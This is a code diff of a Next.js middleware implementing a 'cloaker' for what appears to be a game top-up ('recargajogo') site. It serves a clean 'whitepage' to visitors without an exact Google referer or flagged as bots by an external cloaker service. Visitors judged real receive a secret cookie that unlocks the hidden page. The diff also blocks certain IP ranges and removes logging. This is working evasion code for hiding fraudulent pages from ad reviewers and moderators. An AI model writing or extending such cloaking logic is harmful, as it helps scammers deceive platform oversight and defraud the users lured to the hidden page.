@@ -12,6 +12,48 @@ const CLOAKER_CONFIG = {
 
 export async function middleware(request: NextRequest) {
   const pathname = request.nextUrl.pathname
+  const referer = request.headers.get('referer') || ''
+  
+  // Debug headers (visíveis no browser)
+  const debugHeaders = {
+    'X-Middleware-Executed': 'true',
+    'X-Middleware-Path': pathname,
+    'X-Middleware-Referer': referer || 'none',
+    'X-Cloaker-Enabled': CLOAKER_CONFIG.enabled ? 'true' : 'false',
+    'X-Cloaker-URL': CLOAKER_CONFIG.url || 'none'
+  }
+  
+  // ============================================
+  // 🌐 ROTAS PÚBLICAS - Acesso livre sem verificações
+  // ============================================
+  const publicRoutes = [
+    '/politica-privacidade',
+    '/termos-uso',
+    '/quem-somos',
+    '/' // Whitepage
+  ]
+  
+  // Rota /sucesso ou /success requer parâmetros
+  const isSuccessRoute = pathname === '/sucesso' || pathname === '/success'
+  if (isSuccessRoute) {
+    const hasParams = request.nextUrl.searchParams.toString().length > 0
+    if (hasParams) {
+      return NextResponse.next()
+    }
+    // Se não tiver parâmetros, redireciona para /
+    return NextResponse.redirect(new URL('/', request.url))
+  }
+  
+  // Liberar rotas públicas
+  if (publicRoutes.includes(pathname)) {
+    const response = NextResponse.next()
+    Object.entries(debugHeaders).forEach(([key, value]) => {
+      response.headers.set(key, value)
+    })
+    response.headers.set('X-Middleware-Route', 'public')
+    return response
+  }
+  
   
   // ============================================
   // 🚫 BLOQUEIO DE IPs ESPECÍFICOS - PRIORIDADE MÁXIMA
@@ -32,11 +74,8 @@ export async function middleware(request: NextRequest) {
   const isBlockedIP = blockedIPRanges.some(range => range.test(clientIp))
   
   if (isBlockedIP) {
-    console.log(`🚫 [BLOQUEIO] IP bloqueado tentou acessar: ${clientIp} - Rota: ${pathname}`)
-    
     // Se tentar acessar qualquer rota que não seja a raiz, redirecionar para /
     if (pathname !== '/' && !pathname.startsWith('/_next') && !pathname.startsWith('/api')) {
-      console.log(`🚫 [BLOQUEIO] Redirecionando IP bloqueado de ${pathname} para /`)
       return NextResponse.redirect(new URL('/', request.url))
     }
     
@@ -72,8 +111,6 @@ export async function middleware(request: NextRequest) {
   })
   
   if (allowedDomains.length > 2 && !isAllowedDomain) {
-    console.log(`🚫 [Middleware] Bloqueado acesso por IP/domínio não autorizado: ${requestHost}`)
-    console.log(`   Domínios permitidos: ${allowedDomains.join(', ')}`)
     return new NextResponse('Forbidden', {
       status: 403,
       headers: {
@@ -86,34 +123,30 @@ export async function middleware(request: NextRequest) {
   // ============================================
   // 🍪 VERIFICAÇÃO DE COOKIE - Prioridade máxima
   // ============================================
+  // Verificar se é localhost (para desabilitar redirecionamentos em desenvolvimento)
+  const isLocalhost = requestHost.includes('localhost') || requestHost.includes('127.0.0.1')
+  
   // Se o usuário já tem cookie válido, liberar acesso total a TODAS as rotas
   const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
   
   if (hasValidCookie) {
-    // Se tem cookie e está na rota raiz (/), redirecionar para /recarga
-    if (pathname === '/' || pathname === '') {
-      console.log('✅ [Middleware] Cookie válido - redirecionando / para /recarga')
-      return NextResponse.redirect(new URL('/recarga', request.url))
-    }
+    // Se tem cookie e está na rota raiz (/), redirecionar para /recargajogo
+    // EXCETO em localhost
     
-    // Para outras rotas, liberar acesso (sem log de assets)
-    const isAsset = pathname.startsWith('/images/') || 
-                    pathname.startsWith('/fonts/') || 
-                    pathname.startsWith('/_next/')
-    
-    if (!isAsset) {
-      console.log('✅ [Middleware] Cookie válido - acesso liberado para:', pathname)
+    if ((pathname === '/' || pathname === '') && !isLocalhost) {
+      return NextResponse.redirect(new URL('/recargajogo', request.url))
     }
     
     return NextResponse.next()
   }
   
   // ============================================
-  // 🔒 PROTEÇÃO ROTA /recarga - Apenas com cookie do cloaker
+  // 🔒 PROTEÇÃO ROTA /recargajogo - Apenas com cookie do cloaker
   // ============================================
   // Se chegou aqui, NÃO tem cookie válido
-  if (pathname === '/recarga' || pathname === '/recarga/') {
-    console.log('🚫 [Middleware] Acesso a /recarga sem cookie do cloaker - redirecionando para /')
+  // EXCETO em localhost (permitir acesso livre para desenvolvimento)
+  
+  if ((pathname === '/recargajogo' || pathname === '/recargajogo/') && !isLocalhost) {
     return NextResponse.redirect(new URL('/', request.url))
   }
   
@@ -123,24 +156,22 @@ export async function middleware(request: NextRequest) {
   
   // Apenas na rota raiz (/) e se cloaker estiver ativado e configurado
   // Se chegou aqui, o usuário NÃO tem cookie (já verificamos acima)
-  if (pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url) {
+  // DESABILITAR em localhost para desenvolvimento
+  if (pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url && !isLocalhost) {
     // Verificar referer ANTES de chamar o cloaker
     const referer = request.headers.get('referer') || ''
     
     // Se NÃO tiver referer, mostrar whitepage (não chama cloaker)
     if (!referer) {
-      console.log('🚫 [Cloaker] Sem referer - mostrando whitepage')
       return NextResponse.next()
     }
     
     // Se tiver referer mas NÃO for exatamente https://www.google.com/, mostrar whitepage
     if (referer !== 'https://www.google.com/') {
-      console.log('🚫 [Cloaker] Referer inválido:', referer, '- mostrando whitepage')
       return NextResponse.next()
     }
     
     // Se chegou aqui, referer é válido (https://www.google.com/) - chamar cloaker
-    console.log('✅ [Cloaker] Referer válido - verificando com cloaker')
     try {
       // Preparar dados do servidor para o cloaker
       const serverData = {
@@ -178,29 +209,8 @@ export async function middleware(request: NextRequest) {
       if (responseText && responseText.trim()) {
         const result = JSON.parse(responseText)
         
-        // Log detalhado da verificação
-        const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
-        console.log('🔍 [Cloaker] Verificando acesso:', {
-          ip: clientIp,
-          userAgent: request.headers.get('user-agent') || '',
-          referer: request.headers.get('referer') || '',
-          queryString: request.nextUrl.search.substring(1),
-          url: request.nextUrl.pathname + request.nextUrl.search
-        })
-        
-        
-        console.log('📥 [Cloaker] Resposta:', {
-        type: result.type,
-        result: result.result,
-        action: result.action,
-        reason: result.reason,
-        url: result.url,
-        referer: serverData.HTTP_REFERER || 'direct'
-        })
-        
         // Se for "black" (usuário real), setar cookie
         if (result.type === 'black') {
-          console.log('👤 [Cloaker] USUÁRIO REAL detectado - setando cookie')
           const response = NextResponse.next()
           response.cookies.set('_x9f2w8k5', 'true', {
             httpOnly: false, // Permitir leitura no client-side
@@ -210,12 +220,8 @@ export async function middleware(request: NextRequest) {
           })
           return response
         }
-        
-        // Se for "white" (bot), deixar passar sem cookie
-        console.log('🤖 [Cloaker] BOT detectado - mostrando whitepage')
       }
     } catch (error) {
-      console.error('⚠️ [Cloaker] Erro:', error)
       // Em caso de erro, deixar passar (fail-safe)
     }
   }
@@ -364,15 +370,11 @@ export async function middleware(request: NextRequest) {
   // 🔒 SISTEMA DE REFERER WHITELIST (Cloaker Interno)
   // ============================================
   
-  // Verificar se está rodando em ambiente de desenvolvimento local
-  const host = request.headers.get('host') || ''
-  const isLocalhost = host.includes('localhost') || host.includes('127.0.0.1')
-  
   // Em produção, NUNCA liberar localhost (previne bypass com curl)
   if (isLocalhost && process.env.NODE_ENV === 'development') {
     return NextResponse.next()
   }
-
+  
   // ============================================
   // 🔓 ACESSO LIVRE - SEM VERIFICAÇÕES
   // ============================================
